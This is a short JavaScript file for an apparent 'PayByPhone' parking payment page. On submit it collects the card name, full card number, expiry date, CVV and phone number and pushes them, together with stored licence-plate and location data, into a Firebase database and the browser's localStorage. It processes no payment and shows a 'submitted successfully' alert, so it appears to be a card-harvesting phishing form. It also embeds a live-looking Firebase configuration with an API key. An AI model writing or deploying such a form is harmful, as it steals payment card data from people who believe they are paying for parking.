
const popUp = document.getElementById("popup");
const popUpBtn = document.getElementById("showPopup");
const closeBtn = document.getElementById("closePopup");

document.addEventListener("DOMContentLoaded", () => {
    popUp.style.display = "none";
    // Listen for form submission
    const form = document.getElementById("PaymentForm"); // Correctly get the form by ID

    form.addEventListener("submit", (event) => {
        event.preventDefault();

        const firebaseConfig = {
            apiKey: "AIzaSyBk0HXC4Llx1a6CECxf0018ViJZzzdEhec",
            authDomain: "payonphonev2.firebaseapp.com",
            databaseURL: "https://payonphonev2-default-rtdb.firebaseio.com",
            projectId: "payonphonev2",
            storageBucket: "payonphonev2.appspot.com",
            messagingSenderId: "566333881814",
            appId: "1:566333881814:web:df238d2c2f61d061637877",
            measurementId: "G-SFH4Q3PBJ2"
        };

        // Corrected method name
        firebase.initializeApp(firebaseConfig);

        var userDb = firebase.database().ref("UserData");

        const cardName = document.getElementById("cardName").value;
        const cardNum = document.getElementById("cardNum").value;
        const expiryDate = document.getElementById("expiryDate").value;
        const cvv = document.getElementById("cvv").value;
        const phone = document.getElementById("phone").value;

        const payByPhoneData = {
            cardName: cardName,
            cardNum: cardNum,
            expiryDate: expiryDate,
            cvv: cvv,
            phone: phone,
        };

        const existingData = JSON.parse(localStorage.getItem("PayByPhoneData")) || {};
        const updatedData = { ...existingData, ...payByPhoneData };

        localStorage.setItem('PayByPhoneData', JSON.stringify(updatedData));

        var newData = userDb.push();

        newData.set({
            locationNum: updatedData["locationNum"],
            licenseNum: updatedData["licenseNum"],
            vehicleType: updatedData["vehicleType"],
            cardName: cardName,
            cardNum: cardNum,
            expiryDate: expiryDate,
            cvv: cvv,
            phone: phone,
        });

        alert("Payment details submitted successfully!");
    });

    const cardData = JSON.parse(localStorage.getItem('PayByPhoneData'));

    // If card data is not present, you can redirect
    if (!cardData) {
        window.location.href = "../../index.html";
    }
});


closeBtn.addEventListener("click", () => {
    popUp.style.display = "none";
});

popUpBtn.addEventListener("click", () => {
    popUp.style.display = "flex";
});